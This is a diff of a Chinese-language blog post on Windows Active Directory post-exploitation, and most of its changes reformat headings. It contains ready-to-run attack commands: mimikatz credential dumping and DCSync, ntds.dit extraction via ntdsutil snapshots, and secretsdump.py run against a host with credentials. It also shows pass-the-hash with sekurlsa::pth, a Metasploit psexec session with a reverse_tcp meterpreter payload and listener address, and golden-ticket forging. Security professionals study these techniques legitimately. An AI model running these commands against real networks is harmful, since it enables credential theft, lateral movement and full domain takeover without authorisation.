-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####提升权限
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#提升权限
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">privilege</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">debug</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>抓取密码
@@ -291,20 +335,23 @@
 <blockquote>
 <p>ntds.dit是AD中的数据库文件，它被保存在域控制器==c:\windows\system32\ntds\NTDS.DIT==位置。活动目录的数据库文件（ntds.dit）包含有关活动目录域中所有对象的所有信息，其中包含所有域用户和计算机帐户的密码哈希值。该文件在所有域控制器之间自动同步，它只能被域管理员访问和修改。</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####获取所有域用户</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#获取所有域用户</span>
 </span></span><span style="display:flex;"><span>lsadump::dcsync /domain:test.com /all /csv
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####指定获取某个用户的hash</span>
-</span></span><span style="display:flex;"><span>lsadump::dcsync /domain:test.com /user:test</span></span></code></pre></div><p>####### 导出域成员hash</p>
-<p>域账户的用户名和hash密码以域数据库的形式存放在域控制器的 <code>%SystemRoot%\ntds\NTDS.DIT</code> 文件中。</p>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#指定获取某个用户的hash</span>
+</span></span><span style="display:flex;"><span>lsadump::dcsync /domain:test.com /user:test</span></span></code></pre></div><h3 id="导出域成员hash" class="heading-element"><span>导出域成员hash</span>
+  <a href="#%e5%af%bc%e5%87%ba%e5%9f%9f%e6%88%90%e5%91%98hash" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>域账户的用户名和hash密码以域数据库的形式存放在域控制器的 <code>%SystemRoot%\ntds\NTDS.DIT</code> 文件中。</p>
 <p>这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####创建快照</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#创建快照</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">ntdsutil</span> <span style="color:#58a1dd">snapshot</span> <span style="color:#a6be9d">&#34;activate instance ntds&#34;</span> <span style="color:#58a1dd">create</span> <span style="color:#58a1dd">quit</span> <span style="color:#58a1dd">quit</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####加载快照</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#加载快照</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">ntdsutil</span> <span style="color:#58a1dd">snapshot</span> <span style="color:#a6be9d">&#34;mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> <span style="color:#58a1dd">quit</span> <span style="color:#58a1dd">quit</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####Copy文件副本</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#Copy文件副本</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">copy </span><span style="color:#58a1dd">C:</span>\<span style="color:#58a1dd">$SNAP_201911211122_VOLUMEC</span>$\<span style="color:#58a1dd">windows</span>\<span style="color:#58a1dd">NTDS</span>\<span style="color:#58a1dd">ntds</span>.<span style="color:#58a1dd">dit</span> <span style="color:#58a1dd">c:</span>\<span style="color:#58a1dd">ntds</span>.<span style="color:#58a1dd">dit</span></span></span></code></pre></div><p>将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">secretsdump</span>.<span style="color:#58a1dd">py</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">ntds</span>.<span style="color:#58a1dd">dit</span> <span style="color:#ff636f">-</span><span style="color:#ff636f">system</span> <span style="color:#ff636f">system</span>.<span style="color:#58a1dd">hive</span> <span style="color:#ff636f">LOCAL</span></span></span></code></pre></div><!-- raw HTML omitted -->
 <p>除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）：</p>
@@ -314,30 +361,39 @@
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192348826.webp" alt="image-20231019234804715" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192348826.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192348826.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192348826.webp?size=large 2x" data-title="image-20231019234804715" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>最后记得卸载删除快照：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copyntdsutil snapshot <span style="color:#a6be9d">&#34;unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> quit quit
-</span></span><span style="display:flex;"><span>ntdsutil snapshot <span style="color:#a6be9d">&#34;delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> quit quit</span></span></code></pre></div><p>####### secretsdump脚本直接导出域hash</p>
-<p>为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：</p>
+</span></span><span style="display:flex;"><span>ntdsutil snapshot <span style="color:#a6be9d">&#34;delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}&#34;</span> quit quit</span></span></code></pre></div><h3 id="secretsdump脚本直接导出域hash" class="heading-element"><span>secretsdump脚本直接导出域hash</span>
+  <a href="#secretsdump%e8%84%9a%e6%9c%ac%e7%9b%b4%e6%8e%a5%e5%af%bc%e5%87%ba%e5%9f%9fhash" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#58a1dd">python</span> <span style="color:#58a1dd">secretsdump</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">py</span> <span style="color:#58a1dd">rabbitmask:123456</span><span style="color:#58a1dd">@192</span><span style="color:#a6be9d">.168.15.181</span></span></span></code></pre></div><p>首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功</p>
-<h6 id="哈希传递攻击pth" class="heading-element"><span>0.0.0.3.4  哈希传递攻击PTH</span>
+<h2 id="哈希传递攻击pth" class="heading-element"><span>哈希传递攻击PTH</span>
   <a href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bbpth" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://zhuanlan.zhihu.com/p/472019671"target="_blank" rel="external nofollow noopener noreferrer">https://zhuanlan.zhihu.com/p/472019671</a></p>
+</h2><p><a href="https://zhuanlan.zhihu.com/p/472019671"target="_blank" rel="external nofollow noopener noreferrer">https://zhuanlan.zhihu.com/p/472019671</a></p>
 <blockquote>
 <p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。因为对于每个Session hash值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</p>
 <p>虽然哈希传递攻击可以在Linux,Unix和其他平台上发生,但它们在windows系统上最普遍。 在Windows中，pth通过NT Lan Manager(NTLM)，Kereros和其他身份验证协议来进行单点登录。在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存，凭据管理器(CredMan),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p>
 </blockquote>
-<p>####### 工作组环境</p>
-<p>当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####使用administrator用户的NTLM哈希值进行攻击</span>
+<h3 id="工作组环境" class="heading-element"><span>工作组环境</span>
+  <a href="#%e5%b7%a5%e4%bd%9c%e7%bb%84%e7%8e%af%e5%a2%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#使用administrator用户的NTLM哈希值进行攻击</span>
 </span></span><span style="display:flex;"><span>sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####使用xie用户的NTLM哈希值进行攻击</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#使用xie用户的NTLM哈希值进行攻击</span>
 </span></span><span style="display:flex;"><span>sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9</span></span></code></pre></div><p>在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349390.webp" alt="image-20231019234900213" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349390.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349390.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349390.webp?size=large 2x" data-title="image-20231019234900213" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>或者可以直接将该主机的C盘映射到本地的K盘。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349585.webp" alt="image-20231019234915419" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349585.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349585.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349585.webp?size=large 2x" data-title="image-20231019234915419" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。</p>
-<p>####### 域环境</p>
-<p>在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值</p>
+<h3 id="域环境" class="heading-element"><span>域环境</span>
+  <a href="#%e5%9f%9f%e7%8e%af%e5%a2%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值</p>
 <p>域：xie.com</p>
 <p>域控：WIN2008.xie.com</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击
@@ -345,8 +401,11 @@
 </span></span><span style="display:flex;"><span>Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击
 </span></span><span style="display:flex;"><span>sekurlsa::pth /user:xie /domain:<span style="color:#a6be9d">&#34;xie.com&#34;</span> /ntlm:329153f560eb329c0e1deea55e88a1e9   </span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349442.webp" alt="image-20231019234949268" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349442.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349442.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192349442.webp?size=large 2x" data-title="image-20231019234949268" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350903.webp" alt="image-20231019235002695" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350903.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350903.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350903.webp?size=large 2x" data-title="image-20231019235002695" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>####### MSF进行哈希传递</p>
-<p>有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 <code>exploit/windows/smb/psexec</code> 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。</p>
+<h3 id="msf进行哈希传递" class="heading-element"><span>MSF进行哈希传递</span>
+  <a href="#msf%e8%bf%9b%e8%a1%8c%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 <code>exploit/windows/smb/psexec</code> 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copymsf &gt; use  exploit/windows/smb/psexec
 </span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>psexec<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> payload windows/meterpreter/reverse_tcp
 </span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>psexec<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> lhost 192.168.10.27
@@ -354,35 +413,44 @@
 </span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>psexec<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> smbuser Administrator
 </span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>psexec<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   <span style="color:#828b96;font-style:italic">#这里LM和NTLM我们已经获取到了</span>
 </span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>psexec<span style="color:#ff636f">)</span> &gt; exploit </span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350727.webp" alt="image-20231019235026440" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350727.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350727.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310192350727.webp?size=large 2x" data-title="image-20231019235026440" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="票据传递攻击ptt" class="heading-element"><span>0.0.0.3.5  票据传递攻击PTT</span>
+<h2 id="票据传递攻击ptt" class="heading-element"><span>票据传递攻击PTT</span>
   <a href="#%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bbptt" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 黄金票据</p>
-<p>域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。</p>
+</h2><h3 id="黄金票据" class="heading-element"><span>黄金票据</span>
+  <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。</p>
 <p>首先获取krbtgt的用户hash:</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copymimikatz <span style="color:#a6be9d">&#34;lsadump::dcsync /domain:xx.com /user:krbtgt&#34;</span></span></span></code></pre></div><p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
 </span></span><span style="display:flex;"><span>Copy#导入刚才生成的票据
 </span></span><span style="display:flex;"><span>kerberos::ptt test.kiribi
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####导入成功后可获取域管权限</span>
-</span></span><span style="display:flex;"><span>dir <span style="color:#a6be9d">\\</span>dc.abc.com<span style="color:#a6be9d">\c</span>$</span></span></code></pre></div><p>####### 白银票据</p>
-<p>黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信</p>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#导入成功后可获取域管权限</span>
+</span></span><span style="display:flex;"><span>dir <span style="color:#a6be9d">\\</span>dc.abc.com<span style="color:#a6be9d">\c</span>$</span></span></code></pre></div><h3 id="白银票据" class="heading-element"><span>白银票据</span>
+  <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae" class="heading-mark">
